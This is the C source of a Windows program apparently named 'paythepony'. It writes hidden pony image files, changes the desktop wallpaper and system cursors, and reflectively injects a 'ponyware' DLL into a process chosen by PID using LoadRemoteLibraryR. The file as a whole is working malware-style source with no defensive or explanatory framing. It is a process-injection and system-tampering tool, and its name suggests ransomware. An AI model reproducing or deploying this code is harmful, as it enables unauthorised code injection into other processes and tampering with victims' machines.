#include "paythepony.h"

static const char *thisExe;

int main(int argc, const char *argv[]) 
{
	DWORD pid;
	char *end;
	thisExe = argv[0];

	switch (argc) {

		case NUM_REQUIRED_ARGS + 1:

			// convert pid string to int
			pid = strtol(argv[1], &end, 10);

			// check for errors
			if (*end) {
				printf("\"%s\" is not a pid!\n", argv[1]);
				printHelp();
			}

			// run
			else {
				// set Windows Desktop wallpaper to ponies
				setWallpaperToPonies();

				// change cursor to ponies
				setCursorToPonies();

				// inject DLL
				injectPonywareDll(pid);
			}
			break;

		default:
			printHelp();
			
	}

	return 0;
}

/* print help */
void printHelp() {
	printf("Syntax: %s pid\n", thisExe);
}

/* set Windows Desktop wallpaper to ponies */
void setWallpaperToPonies() {
	
	BOOL  tryAgain                 = FALSE;
	WCHAR *filename                = NULL;
	WCHAR filepath[MAX_PATH + 1]   = {0};
	WCHAR filepathEx[MAX_PATH + 1] = {0};
	DWORD error                    = ERROR_SUCCESS;

	do {
		// create file with random filename
		filename = genRandFilename_alloc(WALLPAPER_RANDNAME_SIZE, L".bmp");

		// combine filename with wallpaper location
		wcscpy_s(filepath, MAX_PATH + 1, wallpaperLoc);
		wcscat_s(filepath, MAX_PATH + 1, filename);
		free(filename);

		// expand any environment strings
		if (!ExpandEnvironmentStrings(filepath, filepathEx, MAX_PATH + 1)) {
			wprintf(L"Error %d expanding environment strings in %s\n", GetLastError(), filepath);
			return;
		}
		
		// write ponypaper resource to file
		tryAgain = FALSE;
		if (!writeResourceToFile(IDB_BITMAP1, RT_RCDATA, filepathEx, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY)) {
			tryAgain = TRUE;
			if (GetLastError() != ERROR_FILE_EXISTS) {
				wprintf(L"Error %d creating %s\n", GetLastError(), filepathEx);
				return;
			}
		}
	} while (tryAgain == TRUE);

	// set wallpaper to ponies
	error = setTiledWallpaper(filepathEx);
	if (ERROR_SUCCESS != error) {
		wprintf(L"Error %d setting tiled wallpaper to %s\n", error, filepathEx);
		return;
	}

	printf("Successfully set Windows Desktop wallpaper to ponies\n"); 
}

/* set Windows cursor to ponies */
void setCursorToPonies() {

	WCHAR  *normAni        = L"normal.ani";
	WCHAR  *busyAni        = L"busy.ani";
	WCHAR  *textAni        = L"text.ani";	
	HCURSOR ponyNormCursor = NULL;
	HCURSOR ponyBusyCursor = NULL;
	HCURSOR ponyTextCursor = NULL;

	// delete files if they already exist
	SetFileAttributes(normAni, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(normAni);
	SetFileAttributes(busyAni, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(busyAni);
	SetFileAttributes(textAni, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(textAni);

	// write normal cursor resources to file
	if (!writeResourceToFile(IDR_ANI1, L"ANI", normAni, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY)) {
		wprintf(L"Error %d creating %s\n", GetLastError(), normAni);
		goto cleanup;
	}
	// write busy cursor resources to file
	if (!writeResourceToFile(IDR_ANI2, L"ANI", busyAni, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY)) {
		wprintf(L"Error %d creating %s\n", GetLastError(), busyAni);
		goto cleanup;
	}
	// write text cursor resources to file
	if (!writeResourceToFile(IDR_ANI3, L"ANI", textAni, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY)) {
		wprintf(L"Error %d creating %s\n", GetLastError(), textAni);
		goto cleanup;
	}

	// load normal cursor from file
	if ( !(ponyNormCursor = LoadCursorFromFile(normAni)) ) {
		printf("Error %d loading normal pony cursor\n", GetLastError());
		goto cleanup;
	}
	// set normal pony cursor as normal system cursor
	if (!SetSystemCursor(ponyNormCursor, OCR_NORMAL)) {
		printf("Error %d setting normal pony cursor\n", GetLastError());
		goto cleanup;
	}
	
	// load busy cursor from file
	if ( !(ponyBusyCursor = LoadCursorFromFile(busyAni)) ) {
		printf("Error %d loading busy pony cursor\n", GetLastError());
		goto cleanup;
	}
	// set busy pony cursor as busy system cursor
	if (!SetSystemCursor(ponyBusyCursor, OCR_WAIT)) {
		printf("Error %d setting busy pony cursor\n", GetLastError());
		goto cleanup;
	}
	
	// load text cursor from file
	if ( !(ponyTextCursor = LoadCursorFromFile(textAni)) ) {
		printf("Error %d loading text pony cursor\n", GetLastError());
		goto cleanup;
	}
	// set text pony cursor as text system cursor	
	if (!SetSystemCursor(ponyTextCursor, OCR_IBEAM)) {
		printf("Error %d setting text pony cursor\n", GetLastError());
		goto cleanup;
	}

	printf("Successfully set Windows cursors to ponies\n");

cleanup:
	SetFileAttributes(normAni, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(normAni);
	SetFileAttributes(busyAni, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(busyAni);
	SetFileAttributes(textAni, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(textAni);
}

/* inject ponywareDll into PID */
void injectPonywareDll(DWORD pid) {

	HANDLE remoteProc         = NULL;
	BOOL isRemoteProc64       = FALSE;
	LPCSTR filename           = NULL; 
	HANDLE hDllFile           = NULL;
	DWORD  dllFileSize        = 0;
	BYTE   *bDllFile          = NULL;
	DWORD  bytesRead          = 0;
	HANDLE hInjectThread      = NULL;
	DWORD  remoteProcExitCode = 0;

		// open remote process to inject into
  if ( !(remoteProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid)) ) {
		printf("Error %d opening PID %d\n", GetLastError(), pid);
		return;
  }

	// determine if process is 32 or 64-bit
	if (isProcess64(remoteProc)) {
		isRemoteProc64 = TRUE;
	}

	// set DLL to use for injection
	if (isRemoteProc64) {
		filename = "ponyware64.dll";
	}
	else {
		filename = "ponyware32.dll";
	}

	// open DLL to inject
	if ( INVALID_HANDLE_VALUE == (hDllFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) ) {
		printf("Error %d opening %s\n", GetLastError(), filename);
		CloseHandle(remoteProc);
		return;
	}

	// get DLL size
	if ( INVALID_FILE_SIZE == (dllFileSize = GetFileSize(hDllFile, NULL)) ) {
		printf("Error %d getting size of %s\n", GetLastError(), filename);
		CloseHandle(remoteProc);
		CloseHandle(hDllFile);
		return;
	}

	// allocate buffer to read file into
	bDllFile = (BYTE *)malloc(dllFileSize);

	// read DLL file into buffer
	if (!ReadFile(hDllFile, bDllFile, dllFileSize, &bytesRead, NULL) || bytesRead != dllFileSize) {
		printf("Error %d reading %s into buffer\n", GetLastError(), filename);
		CloseHandle(hDllFile);
		goto cleanup;
	}

	// close handle to DLL file now that it's stored in buffer
	CloseHandle(hDllFile);

	// notify user the injection is being attempted
	printf("Attempting to inject %s into PID %d\n", filename, pid);

	// inject DLL
	if ( !(hInjectThread = LoadRemoteLibraryR(remoteProc, bDllFile, dllFileSize, NULL)) ) {
		printf("Failed to inject %s into PID %d\n", filename, pid);
		goto cleanup;
	}

	// notify user of successful injection
	printf("Injecting ponyware into PID %d was successful!\n", pid);

cleanup:
	// close injected handle
	if (hInjectThread) {
		CloseHandle(hInjectThread);
	}
	// free memory	
	free(bDllFile);
	// close handle to process
  CloseHandle(remoteProc);
}